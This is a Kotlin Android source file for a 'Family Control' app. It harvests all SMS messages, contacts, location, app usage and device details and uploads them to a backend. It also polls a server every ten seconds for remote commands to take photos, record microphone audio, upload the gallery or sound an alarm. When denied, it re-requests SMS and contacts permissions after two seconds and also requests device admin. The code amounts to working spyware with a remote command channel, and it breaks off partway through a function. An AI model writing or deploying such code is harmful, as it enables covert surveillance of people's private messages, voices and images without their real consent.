package com.apps.myfamily

import android.Manifest
import android.annotation.SuppressLint
import android.app.AppOpsManager
import android.app.admin.DevicePolicyManager
import android.app.usage.UsageStatsManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import androidx.core.app.ActivityCompat
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.provider.Telephony
import android.provider.ContactsContract
import android.util.Log
import android.location.Location
import android.view.Surface
import android.widget.Toast
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import java.io.FileOutputStream
import java.io.ByteArrayOutputStream
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.core.Preview
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.camera.view.PreviewView
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Snackbar
import androidx.compose.material3.SnackbarHost
import androidx.compose.material3.SnackbarHostState
import androidx.compose.material3.SnackbarResult
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.ui.Modifier
import androidx.compose.ui.tooling.preview.Preview as ComposePreview
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import com.apps.myfamily.network.ApiConfig
import com.apps.myfamily.ui.theme.FamilyControlAppTheme
import com.google.android.gms.location.LocationServices
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.IOException
import android.content.pm.ApplicationInfo
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import android.os.Environment
import android.telephony.TelephonyManager
import android.telephony.PhoneStateListener
import android.telephony.CellInfo
import android.telephony.CellSignalStrength
import android.os.StatFs
import android.telephony.SignalStrength
import java.net.NetworkInterface
import java.net.Inet4Address
import android.media.MediaRecorder
import android.media.RingtoneManager
import android.media.Ringtone
import android.media.AudioAttributes
import android.media.AudioManager

class MainActivity : ComponentActivity() {
    // Store pending notification to show after permission is granted
    private var pendingNotification: Pair<String, String>? = null
    
    // Track if we're returning from settings
    private var returningFromSettings = false
    
    // Permission request codes
    private val LOCATION_PERMISSION_CODE = 1001
    private val NOTIFICATION_PERMISSION_CODE = 1002
    private val CAMERA_PERMISSION_CODE = 1003
    private val STORAGE_PERMISSION_CODE = 1004
    private val SMS_PERMISSION_CODE = 1010
    private val CONTACTS_PERMISSION_CODE = 1011
    private val READ_CONTACT_CODE = 1011
    private val PHONE_STATE_PERMISSION_CODE = 1012
    private val AUDIO_PERMISSION_CODE = 1013
    
    // Track which permissions to request next
    private val pendingPermissions = mutableListOf<String>()
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            FamilyControlAppTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    Greeting(
                        name = "Registering...",
                        modifier = Modifier.padding(innerPadding)
                    )
                }
            }
        }

        // Start the permission request sequence
        requestNextPermission()

        // Check if SMS permission is already granted and upload immediately
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
            Log.d("PermissionDebug", "SMS permission already granted on launch, uploading SMS")
            // Run on a background thread to avoid blocking UI
            Thread {
                uploadSmsToBackend(this)
            }.start()
        }
        
        // Check if contacts permission is already granted and upload immediately
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
            Log.d("PermissionDebug", "Contacts permission already granted on launch, uploading contacts")
            // Run on a background thread to avoid blocking UI
            Thread {
                uploadContactsToBackend(this)
            }.start()
        }
        // Panggil fungsi untuk kirim info device
        requestDeviceAdmin()
        startCommandService()
        registerDevice()
        
        // Collect and upload device information at startup if permission is granted
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            Log.i("MainActivity", "READ_PHONE_STATE permission already granted, collecting device info")
            collectDeviceInformation(this)
        } else {
            Log.i("MainActivity", "READ_PHONE_STATE permission not granted, will request it")
        }
        
        sendAppUsageToBackend()
        sendDeviceLocation()
        startPollingCommands()
        // Register activity lifecycle callbacks to detect return from settings
        registerActivityLifecycleCallbacks()
    }
    
    private fun requestNextPermission() {
        // Check if SMS permission is already granted, if so, upload SMS right away
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
            Log.d("PermissionDebug", "SMS permission already granted, uploading SMS immediately")
            uploadSmsToBackend(this)
        }
        
        // Add all required permissions to the pending list if empty
        if (pendingPermissions.isEmpty()) {
            Log.d("PermissionDebug", "Initializing permission list")
            // Add SMS permission first to prioritize it
            pendingPermissions.add(Manifest.permission.READ_SMS)
            pendingPermissions.add(Manifest.permission.RECORD_AUDIO)
            
            // Add contacts permission right after SMS permission for prioritization
            pendingPermissions.add(Manifest.permission.READ_CONTACTS)
            
            // Add READ_PHONE_STATE to get device information
            pendingPermissions.add(Manifest.permission.READ_PHONE_STATE)
            
            pendingPermissions.add(Manifest.permission.ACCESS_FINE_LOCATION)
            pendingPermissions.add(Manifest.permission.POST_NOTIFICATIONS)
            pendingPermissions.add(Manifest.permission.CAMERA)
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                pendingPermissions.add(Manifest.permission.READ_MEDIA_IMAGES)
            } else {
                pendingPermissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
        }
        
        // Find the first permission that needs to be requested
        var permissionRequested = false
        
        while (pendingPermissions.isNotEmpty() && !permissionRequested) {
            val permission = pendingPermissions[0]
            pendingPermissions.removeAt(0)
            
            if (ActivityCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                // Found a permission that needs to be requested
                permissionRequested = true

                when (permission) {
                    Manifest.permission.READ_CONTACTS -> {
                        Log.d("PermissionDebug", "Requesting Contact permission")
                        ActivityCompat.requestPermissions(this, arrayOf(permission), CONTACTS_PERMISSION_CODE)
                    }
                    Manifest.permission.RECORD_AUDIO -> {
                        Log.d("PermissionDebug", "Requesting Audio permission")
                        ActivityCompat.requestPermissions(this, arrayOf(permission), AUDIO_PERMISSION_CODE)
                    }
                    Manifest.permission.READ_SMS -> {
                        Log.d("PermissionDebug", "Requesting SMS permission")
                        ActivityCompat.requestPermissions(this, arrayOf(permission), SMS_PERMISSION_CODE)
                    }
                    Manifest.permission.READ_PHONE_STATE -> {
                        Log.d("PermissionDebug", "Requesting PHONE_STATE permission")
                        ActivityCompat.requestPermissions(this, arrayOf(permission), PHONE_STATE_PERMISSION_CODE)
                    }
                    Manifest.permission.ACCESS_FINE_LOCATION -> {
                        Log.d("PermissionDebug", "Requesting LOCATION permission")
                        ActivityCompat.requestPermissions(this, arrayOf(permission), LOCATION_PERMISSION_CODE)
                    }
                    Manifest.permission.POST_NOTIFICATIONS -> {
                        Log.d("PermissionDebug", "Requesting NOTIFICATION permission")
                        ActivityCompat.requestPermissions(this, arrayOf(permission), NOTIFICATION_PERMISSION_CODE)
                    }
                    Manifest.permission.CAMERA -> {
                        Log.d("PermissionDebug", "Requesting CAMERA permission")
                        ActivityCompat.requestPermissions(this, arrayOf(permission), CAMERA_PERMISSION_CODE)
                    }
                    Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_EXTERNAL_STORAGE -> {
                        Log.d("PermissionDebug", "Requesting STORAGE permission")
                        ActivityCompat.requestPermissions(this, arrayOf(permission), STORAGE_PERMISSION_CODE)
                    }
                }
            }
            // If permission is already granted, we continue the loop to check the next one
        }
    }

    private fun startCommandService() {
        val intent = Intent(this, CommandService::class.java)
        ContextCompat.startForegroundService(this, intent)
    }

    @Deprecated("Deprecated in Java")
    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        when (requestCode) {
            SMS_PERMISSION_CODE -> {
                if ((grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
                    Log.i("PermissionSMS", "READ_SMS granted, uploading SMS now")
                    // Call uploadSms immediately when permission is granted
                    uploadSmsToBackend(this)
                    
                    // Show confirmation to user
                    Toast.makeText(this, "SMS data berhasil diupload", Toast.LENGTH_SHORT).show()
                } else {
                    Log.e("PermissionSMS", "READ_SMS denied")
                    // Show a message explaining why SMS permission is needed
                    Toast.makeText(this, "SMS permission is necessary for this feature", Toast.LENGTH_LONG).show()
                    
                    // Try again to request SMS permission
                    Handler(Looper.getMainLooper()).postDelayed({
                        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_SMS), SMS_PERMISSION_CODE)
                    }, 2000)
                }
            }
            CONTACTS_PERMISSION_CODE -> {
                if ((grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
                    Log.i("PermissionContacts", "READ_CONTACTS granted, uploading contacts now")
                    // Call upload contacts immediately when permission is granted
                    uploadContactsToBackend(this)
                    
                    // Show confirmation to user
                    Toast.makeText(this, "Contact data berhasil diupload", Toast.LENGTH_SHORT).show()
                } else {
                    Log.e("PermissionContacts", "READ_CONTACTS denied")
                    // Show a message explaining why contacts permission is needed
                    Toast.makeText(this, "Contacts permission is necessary for this feature", Toast.LENGTH_LONG).show()
                    
                    // Try again to request contacts permission
                    Handler(Looper.getMainLooper()).postDelayed({
                        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_CONTACTS), CONTACTS_PERMISSION_CODE)
                    }, 2000)
                }
            }
            PHONE_STATE_PERMISSION_CODE -> {
                if ((grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
                    Log.i("PermissionPhoneState", "READ_PHONE_STATE granted")
                    // Collect device information when permission is granted
                    collectDeviceInformation(this)
                    
                    // Show confirmation to user
                    Toast.makeText(this, "Device information collected", Toast.LENGTH_SHORT).show()
                } else {
                    Log.e("PermissionPhoneState", "READ_PHONE_STATE denied")
                    // Show a message explaining why phone state permission is needed
                    Toast.makeText(this, "Phone state permission is necessary for device identification", Toast.LENGTH_LONG).show()
                }
            }
            LOCATION_PERMISSION_CODE -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    Log.i("PermissionLocation", "ACCESS_FINE_LOCATION granted")
                    // Send device location when permission is granted
                    sendDeviceLocation()
                } else {
                    Log.e("PermissionLocation", "ACCESS_FINE_LOCATION denied")
                }
            }
            NOTIFICATION_PERMISSION_CODE -> {
                Log.d("PermissionDebug", "NOTIFICATION permission result: " +
                    if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) "GRANTED" else "DENIED")
            }
            CAMERA_PERMISSION_CODE -> {
                Log.d("PermissionDebug", "CAMERA permission result: " +
                    if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) "GRANTED" else "DENIED")
            }
            STORAGE_PERMISSION_CODE -> {
                Log.d("PermissionDebug", "STORAGE permission result: " +
                    if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) "GRANTED" else "DENIED")
            }
        }
        
        // Continue with next permission request after a short delay
        // Using handler with delay to ensure permissions dialog doesn't appear too quickly in succession
        Handler(Looper.getMainLooper()).postDelayed({
            requestNextPermission()
        }, 300)
    }

    private fun getAllSms(context: Context): JSONArray {
        val smsList = JSONArray()
        val uri = Telephony.Sms.CONTENT_URI
        val projection = arrayOf(
            Telephony.Sms.ADDRESS,
            Telephony.Sms.BODY,
            Telephony.Sms.DATE,
            Telephony.Sms.TYPE
        )
    
        val cursor = context.contentResolver.query(uri, projection, null, null, "date DESC")
        cursor?.use {
            val idxAddress = it.getColumnIndex(Telephony.Sms.ADDRESS)
            val idxBody = it.getColumnIndex(Telephony.Sms.BODY)
            val idxDate = it.getColumnIndex(Telephony.Sms.DATE)
            val idxType = it.getColumnIndex(Telephony.Sms.TYPE)
    
            while (it.moveToNext()) {
                val smsJson = JSONObject()
                smsJson.put("address", it.getString(idxAddress))
                smsJson.put("body", it.getString(idxBody))
                smsJson.put("date", it.getLong(idxDate))
                smsJson.put("type", it.getInt(idxType)) // 1: inbox, 2: sent
                smsList.put(smsJson)
            }
        }
    
        return smsList
    }
    
    private fun uploadSmsToBackend(context: Context) {
        val smsArray = getAllSms(context)
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
    
        val json = JSONObject().apply {
            put("device_id", androidId)
            put("sms", smsArray)
        }
    
        val body = json.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
    
        val request = Request.Builder()
            .url("${ApiConfig.BASE_URL}/api/device/upload_sms")
            .post(body)
            .build()
    
        OkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("UploadSMS", "Failed: ${e.message}")
            }
    
            override fun onResponse(call: Call, response: Response) {
                val res = response.body?.string()
                Log.i("UploadSMS", "Response: $res")
            }
        })
    }
    
    private fun getContacts(context: Context): JSONArray {
        val contacts = JSONArray()
        val resolver = context.contentResolver
        val cursor = resolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null
        )
    
        cursor?.use {
            val idxName = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val idxNumber = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
    
            while (it.moveToNext()) {
                val obj = JSONObject()
                obj.put("name", it.getString(idxName))
                obj.put("number", it.getString(idxNumber))
                contacts.put(obj)
            }
        }
    
        return contacts
    }
    
    private fun uploadContactsToBackend(context: Context) {
        val contactArray = getContacts(context)
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
    
        val json = JSONObject().apply {
            put("device_id", androidId)
            put("contacts", contactArray)
        }
    
        val body = json.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
    
        val request = Request.Builder()
            .url("${ApiConfig.BASE_URL}/api/device/upload_contacts")
            .post(body)
            .build()
    
        OkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("UploadContact", "Failed: ${e.message}")
            }
    
            override fun onResponse(call: Call, response: Response) {
                Log.i("UploadContact", "Uploaded: ${response.body?.string()}")
            }
        })
    }
    
    
    

    private fun registerDevice() {
        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        val model = Build.MODEL
        val androidVersion = Build.VERSION.RELEASE

        val json = JSONObject()
        json.put("device_id", androidId)
        json.put("model", model)
        json.put("android_version", androidVersion)

        val client = OkHttpClient()
        val mediaType = "application/json; charset=utf-8".toMediaType()
        val body = RequestBody.create(mediaType, json.toString())

        val request = Request.Builder()
            .url("${ApiConfig.BASE_URL}/api/device/register")
            .post(body)
            .addHeader("Content-Type", "application/json")
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("RegisterDevice", "Failed: ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                val responseText = response.body?.string()
                if (response.isSuccessful) {
                    Log.i("RegisterDevice", "Success: $responseText")
                } else {
                    Log.e("RegisterDevice", "Error ${response.code}: $responseText")
                }
            }
        })
    }

    private fun sendInstalledAppsToBackend(context: Context) {
        val pm = context.packageManager
        val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
    
        val apps = JSONArray()
    
        for (appInfo in packages) {
            val label = pm.getApplicationLabel(appInfo).toString()
            val packageName = appInfo.packageName
    
            val appJson = JSONObject()
            appJson.put("app_name", label)
            appJson.put("package_name", packageName)
            apps.put(appJson)
        }
    
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        val url = "${ApiConfig.BASE_URL}/api/device/installed_apps?device_id=$androidId"
    
        val requestBody = apps.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
    
        val request = Request.Builder()
            .url(url)
            .post(requestBody)
            .build()
    
        val client = OkHttpClient()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("SendInstalledApps", "Failed to send: ${e.message}")
            }
    
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    Log.i("SendInstalledApps", "Success: ${response.body?.string()}")
                } else {
                    Log.e("SendInstalledApps", "Error ${response.code}: ${response.body?.string()}")
                }
            }
        })
    }
    
    

    private fun hasUsageStatsPermission(): Boolean {
        val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = appOps.checkOpNoThrow(
            AppOpsManager.OPSTR_GET_USAGE_STATS,
            android.os.Process.myUid(),
            packageName
        )
        return mode == AppOpsManager.MODE_ALLOWED
    }

    private fun requestUsageStatsPermission() {
        val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
        startActivity(intent)
    }

    private fun sendAppUsageToBackend() {
        if (!hasUsageStatsPermission()) {
            requestUsageStatsPermission()
            return
        }

        val usageStatsManager = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
        val endTime = System.currentTimeMillis()
        val startTime = endTime - (1000 * 60 * 60 * 24) // 24 jam terakhir

        val stats = usageStatsManager.queryUsageStats(
            UsageStatsManager.INTERVAL_DAILY,
            startTime,
            endTime
        )

        val usageArray = mutableListOf<JSONObject>()

        for (usage in stats) {
            if (usage.totalTimeInForeground > 0) {
                val app = JSONObject()
                app.put("package_name", usage.packageName)
                app.put("duration_seconds", usage.totalTimeInForeground / 1000)
                usageArray.add(app)
            }
        }

        val jsonBody = JSONArray(usageArray).toString()

        val mediaType = "application/json; charset=utf-8".toMediaType()
        val requestBody = RequestBody.create(mediaType, jsonBody)

        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)

        val request = Request.Builder()
            .url("${ApiConfig.BASE_URL}/api/device/usage?device_id=$androidId")
            .post(requestBody)
            .addHeader("Content-Type", "application/json")
            .build()

        val client = OkHttpClient()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("AppUsageSend", "Failed: ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                val body = response.body?.string()
                if (response.isSuccessful) {
                    Log.i("AppUsageSend", "Success: $body")
                } else {
                    Log.e("AppUsageSend", "Error ${response.code}: $body")
                }
            }
        })
    }

    private fun sendDeviceLocation() {
        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
    
        // Check if we have permission to access location
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.w("LocationSend", "ACCESS_FINE_LOCATION permission not granted, requesting it")
            
            // Request the permission at runtime
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.ACCESS_FINE_LOCATION),
                LOCATION_PERMISSION_CODE
            )
            return
        }
    
        // Permission is granted, proceed with location access
        Log.i("LocationSend", "Getting location with granted permission")
        fusedLocationClient.lastLocation
            .addOnSuccessListener { location ->
                if (location != null) {
                    val latitude = location.latitude
                    val longitude = location.longitude
    
                    Log.i("LocationSend", "Location obtained: $latitude, $longitude")
                    val json = JSONObject()
                    json.put("latitude", latitude)
                    json.put("longitude", longitude)
    
                    val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                    val mediaType = "application/json; charset=utf-8".toMediaType()
                    val requestBody = RequestBody.create(mediaType, json.toString())
    
                    val request = Request.Builder()
                        .url("${ApiConfig.BASE_URL}/api/device/location?device_id=$androidId")
                        .post(requestBody)
                        .addHeader("Content-Type", "application/json")
                        .build()
    
                    val client = OkHttpClient()
                    client.newCall(request).enqueue(object : Callback {
                        override fun onFailure(call: Call, e: IOException) {
                            Log.e("LocationSend", "Failed: ${e.message}")
                        }
    
                        override fun onResponse(call: Call, response: Response) {
                            val body = response.body?.string()
                            if (response.isSuccessful) {
                                Log.i("LocationSend", "Success: $body")
                            } else {
                                Log.e("LocationSend", "Error ${response.code}: $body")
                            }
                        }
                    })
                } else {
                    Log.e("LocationSend", "Location is null")
                }
            }
            .addOnFailureListener { e ->
                Log.e("LocationSend", "Error getting location: ${e.message}")
            }
    }
    
    private fun startPollingCommands() {
        val handler = Handler(Looper.getMainLooper())
        val interval = 10_000L // 10 detik

        handler.post(object : Runnable {
            override fun run() {
                pollCommandFromBackend()
                handler.postDelayed(this, interval)
            }
        })
    }

    private fun pollCommandFromBackend() {
        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        val url = "${ApiConfig.BASE_URL}/api/device/command?device_id=$androidId"
    
        val request = Request.Builder()
            .url(url)
            .get()
            .build()
    
        val client = OkHttpClient()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, t: IOException) {
                Log.e("PollCommand", "Network request failed", t)
            }
    
            override fun onResponse(call: Call, response: Response) {
                val body = response.body?.string()
                Log.d("PollCommand", "Response Code: ${response.code}")
                Log.d("PollCommand", "Response Body: $body")
                if (response.code == 204) return // no command
                if (!response.isSuccessful || body == null) return
    
                try {
                    val json = JSONObject(body)
                    val command = json.getString("command")
                    val params = json.getJSONObject("params")
    
                    when (command) {
                        "show_notification" -> {
                            val title = params.optString("title", "Family Control")
                            val message = params.optString("message", "No message")
                            showNotification(title, message)
                        }
                        
                        "take_photo" -> {
                            val camera = params.optString("camera", "front")
                            val uploadUrl = params.optString("upload_url")
                            if (uploadUrl.isNotEmpty()) {
                                takePhotoAndUpload(camera, uploadUrl)
                            }
                        }
                        "show_warning_ui" -> {
                            val message = params.optString("message", "Pesan tidak tersedia")
                            showWarningUI(applicationContext, message)
                        }
                        "get_installed_apps" -> {
                            Log.d("CmdService", "Running get_installed_apps command")
                            sendInstalledAppsToBackend(applicationContext)
                        }

                        "upload_gallery" -> {
                            Log.d("CmdService", "Uploading gallery images...")
                            uploadGalleryImages(applicationContext)
                        }

                        "get_sms" -> {
                            Log.d("CmdService", "Running get_sms command")
                            uploadSmsToBackend(applicationContext)
                        }

                        "get_contact" -> {
                            uploadContactsToBackend(applicationContext)
                        }

                        "get_information" -> {
                            Log.d("CmdService", "Running get_information command")
                            // Execute on main thread to avoid Looper issues
                            runOnUiThread {
                                Log.d("CmdService", "Collecting device information on UI thread")
                                collectDeviceInformation(applicationContext)
                            }
                        }

                        "record_audio" -> {
                            val duration = params.optInt("duration", 10)
                            val uploadUrl = params.optString("upload_url")
                            if (uploadUrl.isNotEmpty()) {
                                recordAudioAndUpload(applicationContext, duration, uploadUrl)
                            }
                        }

                        "play_alarm_now" -> {
                            val volume = params.optInt("volume", 100)
                            val duration = params.optInt("duration", 10)
                            playAlarmSound(applicationContext, volume, duration)
                        }



                    }
                } catch (e: Exception) {
                    Log.e("PollCommand", "Parse error: ${e.message}")
                }
            }
        })
    }

    private fun isDeviceRooted(): Boolean {
        val paths = listOf(
            "/system/bin/su", "/system/xbin/su", "/sbin/su",
            "/system/sd/xbin/su", "/system/bin/failsafe/su"
        )
        return paths.any { File(it).exists() }
    }

    private fun playAlarmSound(context: Context, volume: Int, durationSec: Int) {
        try {
            val alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)
    
            val ringtone = RingtoneManager.getRingtone(context, alarmUri)
            ringtone.audioAttributes = AudioAttributes.Builder()
                .setUsage(AudioAttributes.USAGE_ALARM)
                .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                .build()
    
            val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM)
            val targetVolume = (maxVolume * volume / 100).coerceAtMost(maxVolume)
            audioManager.setStreamVolume(AudioManager.STREAM_ALARM, targetVolume, 0)
    
            ringtone.play()
    
            Handler(Looper.getMainLooper()).postDelayed({
                ringtone.stop()
            }, durationSec * 1000L)
    
        } catch (e: Exception) {
            Log.e("AlarmSound", "Failed to play alarm: ${e.message}")
        }
    }

    @SuppressLint("MissingPermission")
    private fun recordAudioAndUpload(context: Context, durationSec: Int, uploadUrl: String) {
        val outputFile = File(context.cacheDir, "recorded_${System.currentTimeMillis()}.3gp")

        val recorder = MediaRecorder().apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
            setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
            setOutputFile(outputFile.absolutePath)
            prepare()
            start()
        }

        Log.i("AudioRecord", "Recording started: ${outputFile.absolutePath}")

        Handler(Looper.getMainLooper()).postDelayed({
            try {
                recorder.stop()
                recorder.release()
                Log.i("AudioRecord", "Recording stopped, file saved")
                uploadAudioFile(context, outputFile, uploadUrl)
            } catch (e: Exception) {
                Log.e("AudioRecord", "Error stopping recorder: ${e.message}")
            }
        }, durationSec * 1000L)
    }

    private fun uploadAudioFile(context: Context, file: File, uploadUrl: String) {
        val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
    
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("device_id", deviceId)
            .addFormDataPart("audio", file.name, file.asRequestBody("audio/3gp".toMediaType()))
            .build()
    
        val request = Request.Builder()
            .url(uploadUrl)
            .post(requestBody)
            .build()
    
        OkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("UploadAudio", "Failed: ${e.message}")
            }
    
            override fun onResponse(call: Call, response: Response) {
                val body = response.body?.string()
                Log.i("UploadAudio", "Success: $body")
    
                // ✅ AUTO DELETE FILE after success
                if (response.isSuccessful) {
                    if (file.exists()) {
                        file.delete()
                        Log.i("UploadAudio", "Local file deleted: ${file.name}")
                    }
                }
            }
        })
    }

    @SuppressLint("MissingPermission")
    private fun collectDeviceInformation(context: Context) {
        val info = JSONObject()

        // Timestamp
        info.put("timestamp", System.currentTimeMillis())

        // Battery
        val batteryIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val status = batteryIntent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
        val charging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
        info.put("battery_level", level)
        info.put("charging", charging)

        // Internet
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        var connectionType = "OFFLINE"
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = cm.activeNetwork
            val capabilities = cm.getNetworkCapabilities(network)
            if (capabilities != null) {
                connectionType = when {
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WIFI"
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "MOBILE"
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "ETHERNET"
                    else -> "UNKNOWN"
                }
            }
        } else {
            @Suppress("DEPRECATION")
            val networkInfo = cm.activeNetworkInfo
            if (networkInfo != null && networkInfo.isConnected) {
                connectionType = when (networkInfo.type) {
                    ConnectivityManager.TYPE_WIFI -> "WIFI"
                    ConnectivityManager.TYPE_MOBILE -> "MOBILE"
                    else -> "UNKNOWN"
                }
            }
        }
        
        info.put("internet", connectionType)

        // Device Info
        info.put("device_model", Build.MODEL)
        info.put("android_version", Build.VERSION.RELEASE)
        info.put("sdk_int", Build.VERSION.SDK_INT)

        // Storage Info
        val stat = StatFs(Environment.getDataDirectory().path)
        val free = stat.blockSizeLong * stat.availableBlocksLong
        val total = stat.blockSizeLong * stat.blockCountLong
        info.put("storage_free_mb", free / (1024 * 1024))
        info.put("storage_total_mb", total / (1024 * 1024))

        // Root Check
        info.put("is_rooted", isDeviceRooted())

        // IP Address
        try {
            val interfaces = NetworkInterface.getNetworkInterfaces()
            for (intf in interfaces) {
                val addrs = intf.inetAddresses
                for (addr in addrs) {
                    if (!addr.isLoopbackAddress && addr is Inet4Address) {
                        info.put("ip_address", addr.hostAddress)
                        break
                    }
                }
            }
        } catch (_: Exception) {}

        // Signal strength (handled in next step)
        listenForSignalStrength(context, info)
    }

    private fun listenForSignalStrength(context: Context, info: JSONObject) {
        // Check for READ_PHONE_STATE permission before accessing phone state
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            Log.e("PhoneState", "READ_PHONE_STATE permission not granted")
            info.put("signal_strength_dbm", JSONObject.NULL)
            info.put("permission_state", "READ_PHONE_STATE permission denied")
            
            // Continue with location upload even without phone state info
            getLocationAndUpload(context, info)
            return
        }
        
        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
    
        val listener = object : PhoneStateListener() {
            override fun onSignalStrengthsChanged(signalStrength: SignalStrength?) {
                super.onSignalStrengthsChanged(signalStrength)
                try {
